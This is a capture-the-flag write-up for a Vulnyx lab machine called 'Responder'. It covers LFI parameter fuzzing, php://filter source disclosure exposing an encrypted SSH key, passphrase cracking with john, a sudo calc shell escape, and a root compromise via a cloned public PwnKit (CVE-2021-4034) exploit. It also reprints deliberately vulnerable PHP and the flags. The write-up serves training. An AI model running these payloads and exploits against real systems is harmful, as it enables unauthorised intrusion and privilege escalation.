# Vulnyx: Responder

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `ssh2john` · `john` |
| **Tags** | `#LFI` `#IPv6` `#HashCracking` `#SudoAbuse` `#GTFOBins` `#PwnKit` `#CVE-2021-4034` |
| **URL** | https://vulnyx.com/machines/ |

`filemanager.php`'s file-read parameter, found by fuzzing rather than guessing, doubles as a way to read `/proc/net/if_inet6` — revealing (like on another box in this set) an IPv6 link-local address where SSH is actually reachable, alongside a recoverable SSH key. From there, a `sudo` rule around `calc` escalates to a second user via its shell-escape feature, and a SUID `pkexec` binary is vulnerable to CVE-2021-4034 ("PwnKit"), reaching root directly.

## Enumeration

### Port Enumeration

A full TCP port scan comes first — only **80 (HTTP)** comes back open:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn responder.nyx

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:8D:65:ED (Oracle VirtualBox virtual NIC)
```

```bash
$ sudo nmap -p 80 -sCV responder.nyx

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:8D:65:ED (Oracle VirtualBox virtual NIC)
```

With SSH conspicuously absent over IPv4 — unusual for a Linux box — HTTP is the only way in, at least to start.

### Web Enumeration

```
http://responder.nyx/
```

<img src="../Images/responder/Pasted image 20260529180633.png"/>

A content scan turns up `filemanager.php`, which redirects (302) rather than serving content directly — a hint it expects a parameter:

```bash
$ ffuf -u http://responder.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html             [Status: 200, Size: 31, Words: 6, Lines: 2, Duration: 3ms]
.html                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 207ms]
.php                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 211ms]
.php                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
.html                  [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 7ms]
filemanager.php        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 223ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 12ms]
```

## Initial Access

### LFI Parameter Discovery

`filemanager.php` clearly takes a parameter, but its name is unknown — so it's fuzzed directly against a known file (`/etc/passwd`), filtering out zero-size responses so only a working parameter shows up:

```bash
$ ffuf -u http://responder.nyx/filemanager.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0

random                 [Status: 302, Size: 1430, Words: 13, Lines: 28, Duration: 10ms]
```

The parameter turns out to be `random`. Confirmed directly:

```http
GET /filemanager.php?random=/etc/passwd HTTP/1.1
Host: responder.nyx
```

<img src="../Images/responder/Pasted image 20260529180051.png"/>

### Discovering an IPv6-Only SSH Service

Since SSH didn't show up on IPv4, the LFI is pointed at `/proc/net/if_inet6` — the kernel's list of configured IPv6 addresses — to find an address the target isn't otherwise advertising:

```http
GET /filemanager.php?random=/proc/net/if_inet6 HTTP/1.1
Host: responder.nyx
```

<img src="../Images/responder/Pasted image 20260529180119.png"/>

Reformatting the first entry into standard IPv6 notation and scanning it confirms SSH is listening there — reachable only over IPv6:

```bash
$ sudo nmap -6 -p 22 fe80:0000:0000:0000:0a00:27ff:fe8d:65ed

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:8D:65:ED (Oracle VirtualBox virtual NIC)
```

### Reading filemanager.php's Own Source

An SSH key is still needed. The `php://filter` wrapper reads the script's own source as base64 (so the PHP isn't executed on the way out), and it turns out to carry a private key in a comment:

```bash
$ curl -X GET "http://responder.nyx/filemanager.php?random=php://filter/convert.base64-encode/resource=/var/www/html/filemanager.php" | base64 -d > filemanager.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2464  100  2464    0     0   628.5k      0 --:--:-- --:--:-- --:--:--
```

```bash
$ cat filemanager.txt
<?php
    $filename = $_GET['random'];
    include($filename);
    header('Location:/');


/*

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,411124D3C302D4F4

XC2kbWNBYa20zDArT6BMeCgKa9oRs8T5sCVws1wGik8ZWChF4h6N9TzDnDGEMUPG
X+lKp/fDKiZxmJdWu3WhLjgiXNbvX+fLiKZpWBzCAVpwSicS/jjIopzzWjE3PAB7
vRfwdqdiaFK7mQxLJ3o/yrK2CCI8ud2ULEEk8DxTMGklmff8cbhrWIc+by+9AS9t
vKd7hrsoLR6FaxBmfd04dr1Qn9PZkvohHnMnpI7fdEC2Q3aqu6tFIODcVm6rBaII
QM0CIRdWH/WiW7XmtJUriF55rQRJq4+ShXWtWKBXyJnYvyEduqQhieJ0BA9ZJjzy
myaV1V5l0eKMhxWWBkYaz6bmFsLpbmXBBgIaiozKSKIMGWa1sWCAGv0EmMDRnDG4
ClxkqgnDcgYskrdZLPJ5YN77M9OuB30/VIGXjzskJPp2XaubzYS7BvNjTbiD5uCU
i1fHEzpPI/QeHQ25XlqlGCUla6b8mLFKMM91KcjO6TOSYgArC+kykbuqgDPMc7kt
MKhxrsykmpkNz6FxsF78k/bmstPNbYDsa4ynzlIpiQHms+papIDcsHM4rUDib8Jh
HQMfjbSchpL0YxVXAiz4Nvo33VQxp1WRh0geoO3bYz1D94FvozpeILFexnAKaQeT3
GLCLNyZ1BK/p5KKh5F1OhUU0brghzks5NjFYfNoGdnKfRsOIA+6X97AiDjqg9mk4
YfbOgKHl75uELy41WzuNnuynfwWkANz7BhWV/QCLS7NiyaCucXJBJj3LRdT4Ckqf
3F1SNgshDq4vDC4RwkJW2umTmDpW0rZ3syzeb9P4/bmQXkWX/btoIJzmnB6y++Bs
XIrtZKa1yJ6/M0XA6tGTi+bnYD0wOmoU64M3I21HXvQUOXgSg5o0jIQceTKcIN/
wLLNM0ybmzq7z+MllGrpyOez/fSAECvagyUZRmnks0eRR1oKzMS00e+qEFJ4GmeE
Yu2dITC6I3pVRZQGcCsZWCX+BP+64Lcdz4/n5lensjab0jd28Kc72sraDteSlP/Y
wWZM9sYbXtcs14cIPpW3a1dbkOT1WGEwjt0X0F0DNgApvA8XnlTr+whJvaMByA4U
t3UQHVUINNoLnX7uSBPo96yWcwAMuXjk8j3ZaFVd5rOGq/Xd0pKBBARd2Un9QZnN
4PzEWFld9/BObzSeo2dVEZgYXcRE3v0oEZImFIoxQcvgoxxeYjNViX0SsYEJfA9F
Pg8ZQ6R+ZjA3pU1DqBxWnErHDyeGsnVBs8VIQK0iiZMeB12Tx9b9k8E6rjRIw6La
UbzpR+4CVgToD5TZBDpHhWHdPcv3JuNAb49XGdsL889uTwBX+fSTvL6FkXtZjySX
gm6v5x/OPZg4BB/CnCWSeiG+rW0iMU4TGE5LqfuyBZBOhVcDtri3qpYLGH/5NKfw
dq15m9rReh/Jec6Z8BNi9Xo5gEjGglQA/Tfw2VqCmrsMaU3iNMNXLKrYTcsm0qHb
vRYvQl9GgeApdrZ/BY/ySb6OjNUS1Nc9Viv0AM9iCHp4tH6OfmVpnVzDuojdkXiZ
1B/vwbCo9CcBZt7lM91Hl60ZlhLsOa/69PaeC3cZR2Z1svYk1gcDrw=
-----END RSA PRIVATE KEY-----

*/
?>
```

### Cracking id_rsa's Passphrase

The key is copied out of the comment into `id_rsa`. It's passphrase-protected, so its hash is extracted and cracked against `rockyou.txt`:

```bash
$ chmod 600 id_rsa
$ ssh2john id_rsa > id_rsa.hash
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
elliott          (id_rsa)
Session completed.
```

> **Passphrase:** `elliott`

### Shell as elliot

The key logs in over IPv6 — link-local addresses need a zone identifier (`%eth0`) since the same address can exist on multiple interfaces:

```bash
$ ssh -i id_rsa -6 elliot@'fe80:0000:0000:0000:0a00:27ff:fe8d:65ed%eth0'
Enter passphrase for key 'id_rsa':
Linux responder 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
elliot@responder:~$ id
uid=1001(elliot) gid=1001(elliot) grupos=1001(elliot)
elliot@responder:~$ ls -l /home/elliot/
total 0
```

## Lateral Movement

### Escalating to rohit via `calc`

```bash
elliot@responder:~$ sudo -l
sudo: unable to resolve host responder: Nombre o servicio desconocido
Matching Defaults entries for elliot on responder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elliot may run the following commands on responder:
    (rohit) NOPASSWD: /usr/bin/calc
```

`elliot` can run `/usr/bin/calc` — an arbitrary-precision calculator — as `rohit`. `calc` supports running shell commands directly from its own prompt with a `!` prefix, so the calculator becomes a shell as `rohit`:

```bash
elliot@responder:~$ sudo -u rohit /usr/bin/calc
sudo: unable to resolve host responder: Nombre o servicio desconocido
C-style arbitrary precision calculator (version 2.12.7.2)
Calc is open software. For license details type:  help copyright
[Type "exit" to exit, or "help" for help.]

; !/bin/bash
```

```bash
rohit@responder:/home/elliot$ id
uid=1002(rohit) gid=1002(rohit) grupos=1002(rohit)
rohit@responder:/home/elliot$ ls -l /home/rohit/
total 4
-r--------    1 rohit    rohit           33 abr 20  2023 user.txt
rohit@responder:/home/elliot$ cat /home/rohit/user.txt
38ea4aa29dd3f88ad4b800af12ea42cb
```

> **User flag:** `38ea4aa29dd3f88ad4b800af12ea42cb`

## Privilege Escalation

### PwnKit (CVE-2021-4034)

A sweep for SUID binaries shows `pkexec` present:

```bash
rohit@responder:/home/elliot$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/umount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

> **Binary:** `/usr/bin/pkexec`

`pkexec` here is vulnerable to CVE-2021-4034 ("PwnKit") — a real, widely-known local privilege escalation affecting polkit's `pkexec` due to how it mishandles being invoked with an empty argument list, letting any local user escalate to root on an unpatched system. A public PoC compiles and runs it:

```bash
rohit@responder:/tmp$ git clone https://github.com/berdav/CVE-2021-4034
Clonando en 'CVE-2021-4034'...
remote: Enumerating objects: 92, done.
remote: Counting objects: 100% (36/36), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 92 (delta 24), reused 19 (delta 19), pack-reused 56 (from 1)
Desempaquetando objetos: 100% (92/92), listo.
rohit@responder:/tmp$ cd CVE-2021-4034/
rohit@responder:/tmp/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
rohit@responder:/tmp/CVE-2021-4034$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),1002(rohit)
# ls -l /root
total 4
-r--------    1 root     root            33 Apr 20  2023 root.txt
# cat /root/root.txt
2df90c7733e54427419eee2134ebde5e
```

> **Root flag:** `2df90c7733e54427419eee2134ebde5e`

## Takeaways

- Fuzzing for a parameter's actual name against a known file is more reliable than guessing common ones (`file`, `page`) — it confirms both the vulnerability and the exact name to use in one pass.
- `/proc/net/if_inet6`, read through an LFI, can reveal network configuration — including IPv6 addresses — that no other enumeration step would surface, and a service might only be reachable through exactly that address.
- CVE-2021-4034 (PwnKit) is one of the most impactful Linux local privilege escalation vulnerabilities in recent years precisely because `pkexec` ships SUID by default on most distributions — checking `find / -perm -4000` for it is close to a reflex step at this point.